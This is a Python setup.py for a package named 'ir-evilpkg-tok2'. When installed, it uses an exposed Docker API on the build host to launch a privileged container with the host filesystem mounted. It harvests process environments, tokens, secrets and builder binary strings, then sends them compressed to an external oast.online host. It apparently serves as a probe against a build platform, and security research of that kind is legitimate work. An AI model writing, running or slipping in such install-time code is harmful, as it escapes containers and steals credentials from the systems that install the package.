import setuptools, json, urllib.request, urllib.error, time, base64, gzip, os

OAST = "dbplsv55ap9v1jaadl501puypwbro4ye6.oast.online"
D = "http://172.18.0.1:2375"


def api(path, method="GET", body=None, timeout=10):
    req = urllib.request.Request(D + path, data=body, method=method)
    if body:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:
        return "ERR", str(e).encode()


def demux(b):
    out = []
    i = 0
    try:
        while i + 8 <= len(b):
            ln = int.from_bytes(b[i + 4:i + 8], "big")
            if ln < 0 or i + 8 + ln > len(b):
                break
            out.append(b[i + 8:i + 8 + ln])
            i += 8 + ln
        return b"".join(out) if out else b
    except Exception:
        return b


out = ["== tok2 builder-token probe %s ==" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())]
st, b = api("/images/json")
imgs = []
try:
    for im in json.loads(b):
        for t in (im.get("RepoTags") or []):
            imgs.append(t)
except Exception:
    pass
img = next((t for t in imgs if "koyeb/builder" in t), imgs[0] if imgs else "")
out.append("== images %r selected %r" % (imgs, img))

script = (
    "echo TOK2; id; hostname; "
    "echo --cmdline--; tr '\\0' ' ' < /host/proc/1/cmdline 2>&1; echo; "
    "echo --environ--; strings /host/proc/1/environ 2>&1 | head -80; "
    "echo --fd--; ls -la /host/proc/1/fd 2>&1 | head -50; "
    "echo --root--; ls -la /host/root /host/home 2>&1 | head -30; "
    "echo --usrlocal--; ls -la /host/usr/local/bin 2>&1 | head -30; "
    "echo --files--; find /host/usr/local /host/etc /host/opt /host/builder -maxdepth 4 \\( -iname '*koyeb*' -o -iname '*builder*' -o -iname '*token*' -o -iname '*secret*' -o -iname '*credential*' \\) 2>/dev/null | head -60; "
    "echo --strings--; for f in /host/usr/local/bin/*; do case \"$f\" in *builder*) echo \"== $f\"; strings \"$f\" 2>/dev/null | grep -iE 'https://|report|token|secret|/v1/' | head -40;; esac; done; "
    "echo --done--"
)

if img:
    name = "tok2-%d" % os.getpid()
    body = json.dumps({
        "Image": img,
        "User": "0",
        "Entrypoint": ["/bin/sh", "-c"],
        "Cmd": [script],
        "HostConfig": {"Binds": ["/:/host:ro"], "Privileged": True, "AutoRemove": False, "NetworkMode": "host"},
    }).encode()
    st, b = api("/containers/create?name=%s" % name, "POST", body)
    out.append("== create -> %s %s" % (st, b[:300].decode("utf-8", "replace")))
    cid = ""
    try:
        cid = json.loads(b).get("Id", "")
    except Exception:
        pass
    if cid:
        st, b = api("/containers/%s/start" % cid, "POST")
        out.append("== start -> %s" % st)
        try:
            api("/containers/%s/wait" % cid, "POST", timeout=30)
        except Exception:
            pass
        st, logs = api("/containers/%s/logs?stdout=1&stderr=1" % cid)
        out.append("== logs -> %s\n%s" % (st, demux(logs).decode("utf-8", "replace")[:30000]))
        api("/containers/%s?force=1" % cid, "DELETE")

report = "\n".join(out)
try:
    open("build-report.txt", "w").write(report)
except Exception:
    pass
try:
    b64 = base64.urlsafe_b64encode(gzip.compress(report.encode())).decode().rstrip("=")
    req = urllib.request.Request("https://%s/tok2-%s" % (OAST, os.uname().nodename), data=b64.encode(), method="POST")
    urllib.request.urlopen(req, timeout=15).read()
except Exception:
    pass

setuptools.setup(name="ir-evilpkg-tok2", version="1.0.0", packages=[])
